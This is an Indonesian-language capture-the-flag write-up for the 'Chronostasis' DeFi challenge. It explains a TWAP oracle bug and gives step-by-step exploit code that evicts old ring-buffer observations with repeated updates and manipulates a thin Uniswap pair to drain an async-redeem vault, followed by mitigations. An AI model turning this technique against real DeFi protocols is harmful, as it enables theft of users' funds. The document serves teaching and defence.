---
ctf: "SCTF 2026"
kategori: "Blockchain / DeFi"
challenge: "Chronostasis"
flag: "(tidak dipublikasikan di sumber; drain vault sepenuhnya = solved)"
teknik: "TWAP oracle custom yang _consult-nya berlabuh di observation MANA PUN yang lebih tua dari window; evict observation deploy-time dengan spam 8 update(pair) post-pump di ring buffer, lalu manipulasi vault async-redeem EIP-7540"
sumber: "https://github.com/Abdelkad3r/SCTF-2026/blob/main/chronostasis/README.md"
---

# Chronostasis — SCTF 2026 (Blockchain / DeFi)

## Deskripsi Singkat

Win condition: `vault.totalAssetsLP() < initialVaultLPBalance` — kuras walau cuma satu wei LP dari vault. Gampang dibaca, brutal dipenuhi.

Yang di-deploy: tiga token (TKA, TKB 18-desimal, TKC 6-desimal "USD"), dua pair UniswapV2 (A/B "deep" 1.000.000:1.000.000, B/C "thin" 1.000:1.000 — target pump kanonik), sebuah `TWAPOracle.sol` custom dengan ring buffer per-pair `GRANULARITY = 8` dan `window = 300s` di mana `update(pair)` **public dan tanpa rate limit** (hanya spacing minimum 1 detik), dan sebuah `AsyncLPVault` di atas LP token A/B bergaya EIP-7540 dengan request/claim terpisah: `requestRedeem` men-snapshot `pricePerShare` saat request, `claimRedeem` membayar `lpOut = shares * snapshotPPS / currentLPPrice`, di-clamp ke `totalAssetsLP`.

Vault menghargai LP memakai formula fair-value geometric-mean yang familiar dari literatur oracle harga-LP Uniswap. Observasi krusial: `lpPriceUSD` **linier terhadap `priceB_USD`**. Bengkokkan `priceB_USD` dan seluruh valuasi vault ikut membengkok. Pair A/B yang deep membuat `priceA_in_B` nyaris konstan; pair B/C yang thin adalah tuasnya.

## Analisis — Serangan Naif (dan Kenapa Gagal)

Serangan yang "dimaksud di atas kertas" terbaca seperti setiap exploit TWAP yang pernah kamu lihat: pump B/C dengan TKC→TKB, `requestRedeem` di harga tinggi, tunggu `minRedeemDelay`, dump TKB→TKC, `claimRedeem` dengan rasio HIGH/LOW yang di-clamp ke seluruh saldo vault.

Jam pertama habis di sini. Pump-lalu-snapshot yang naif, bahkan dengan beberapa `oracle.update()` diselipkan di antaranya, **nyaris tidak menggerakkan harga snapshot**. Pump yang seharusnya menggerakkan spot ~5.000× cuma menggerakkan TWAP beberapa persen. Sesuatu sedang merata-ratakan manipulasimu.

## Analisis — Bug Sebenarnya

Fragmen relevan `_consult`:

```solidity
// jalan dari terbaru -> tertua
for (uint256 i = idx; ; ) {
    Observation memory obs = observations[pair][i];
    if (obs.timestamp >= targetTime && obs.timestamp <= newest.timestamp) {
        oldest = obs; // update — masih di dalam window
    } else if (obs.timestamp < targetTime) {
        oldest = obs; // OBSERVATION PERTAMA sebelum window — berlabuh di sini
        break;        // dan BERHENTI mencari
    }
}
```

Loop-nya dengan senang hati berlabuh di **observation mana pun yang lebih tua dari window** dan berhenti di situ. Jadi kalau observation deploy-time milik `Setup` (`obs0`, cumulative price 0 saat deploy) masih duduk beberapa menit sebelum awal window 300-detik saat ini, TWAP-nya jadi `(cum_new − 0) / (ts_new − ts_obs0)` — selisih cumulative price dirata-ratakan di seluruh rentang deploy-ke-sekarang, bukan window 300 detik. Pump 5.000×-mu terdilusi oleh menit-menit harga baseline.

## Eksploitasi / Solusi

Ring-nya 8 slot. Setiap `update(pair)` menulis satu observation baru (dengan spacing minimum 1 detik). Jadi **delapan update post-pump menimpa penuh `obs0`** dan `obs1..obs7` semuanya post-pump. `_consult` berikutnya berjalan terbaru→tertua, menemukan setiap observation di dalam window, lalu melangkah keluar dan mendapati `obs0` sudah hilang — anchor-nya jatuh di observation post-pump, dan TWAP-nya runtuh ke spot yang termanipulasi. Trik yang sama berlaku untuk fase dump.

```python
# Fase 0 — masukkan LP milik kita ke vault
router.addLiquidity(TKA, TKB, 100e18, 100e18, ...)
pairAB.approve(vault); vault.deposit(LP)
oracle.update(pairAB)

# Fase 1 — pump B/C, evict, snapshot
router.swapExactTokensForTokens(TKC -> TKB, 70_000, ...)  # B/C ~5000x naik
for _ in range(8):
    evm_increaseTime(30); evm_mine
    oracle.update(pairBC)                              # 8 observation post-pump total
oracle.update(pairAB)
vault.requestRedeem(shares, player, player)            # snapshot di TWAP_high

# Fase 2 — dump, evict, claim
evm_increaseTime(1); evm_mine
router.swapExactTokensForTokens(TKB -> TKC, all_TKB, ...)  # B/C ~100x turun
for _ in range(8):
    evm_increaseTime(30); evm_mine
    oracle.update(pairBC)
vault.claimRedeem(0)                                   # lpOut clamp ke totalAssetsLP
```

Rasio `lpPriceUSD_snap / lpPriceUSD_claim ≈ 5e5`; `lpOut = shares · 5e5` di-clamp ke `totalAssetsLP ≈ 1.1e24` — mengeringkan hampir seluruh vault dalam satu `claim`.

## Catatan / Insight (Operasional)

Launcher-nya `nc <host> 7000`; RPC baru bind ~15-30 detik setelah deploy (poll `eth_getCode(setup)`). **Jaga sesi TCP `nc` tetap terbuka** — menutupnya merobohkan instance. Anvil vanilla tidak punya `vm.warp`; time-travel lewat `evm_increaseTime` + `evm_mine`. `_consult` di pair AB juga butuh ≥2 observation dan observation terbaru di dalam window — panggil `oracle.update(pairAB)` tepat sebelum `requestRedeem` maupun `claimRedeem`. Pakai `cast send --legacy` di mana-mana (EIP-1559 bikin transaksi silent-drop di Anvil ini).

## Kenapa Bug Ini Ada

Tiga keputusan desain yang masing-masing masuk akal bersama-sama membentuk kemenangan: ring oracle-nya public-write tanpa rate limit; ring-nya cuma 8 slot jadi menimpa seluruh sejarahnya nyaris gratis secara gas; dan vault mengunci satu TWAP saat request dan membayar terhadap TWAP terpisah-yang-bisa-dimiringkan saat claim. Hilangkan satu saja dan serangannya runtuh. Mitigasi pembelanya sama dengan mitigasi industri untuk oracle observation bergaya UniswapV2 mana pun: batasi jumlah observation yang bisa ditulis per blok, berlabuh pencariannya di dalam window (jangan melangkahinya), atau pakai pendekatan Uniswap V3 di mana index oldest-observation maju setiap update. Lebih baik lagi, ambil harga LP dari oracle asset-tracking yang sama sekali tidak menerima observation yang disuplai attacker — Chainlink, Pyth, atau TWAP atas pool dalam dengan barrier LP tinggi.

## Flag

Flag spesifik untuk challenge ini tidak dipublikasikan di sumber (win condition-nya on-chain: `isSolved() == true` setelah vault terkuras).
